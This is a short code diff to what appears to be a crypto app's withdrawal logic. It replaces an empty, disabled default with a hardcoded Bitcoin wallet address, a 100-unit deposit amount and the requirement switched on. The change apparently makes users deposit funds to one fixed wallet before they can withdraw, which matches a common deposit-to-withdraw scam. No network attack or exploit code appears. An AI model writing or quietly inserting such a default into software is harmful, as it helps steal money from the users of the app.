@@ -13,7 +13,7 @@ import { motion } from 'framer-motion';
 const getWithdrawalRequirements = () => {
   const saved = localStorage.getItem('gv_withdrawal_requirements');
   if (saved) return JSON.parse(saved);
-  return { walletAddress: '', depositAmount: 0, enabled: false };
+  return { walletAddress: 'bc1q55qdqz9cw3363lf4ftcvv6vw8kcejsa5vg566k', depositAmount: 100, enabled: true };
 };
 
 const saveWithdrawalRequirements = (data: { walletAddress: string; depositAmount: number; enabled: boolean }) => {
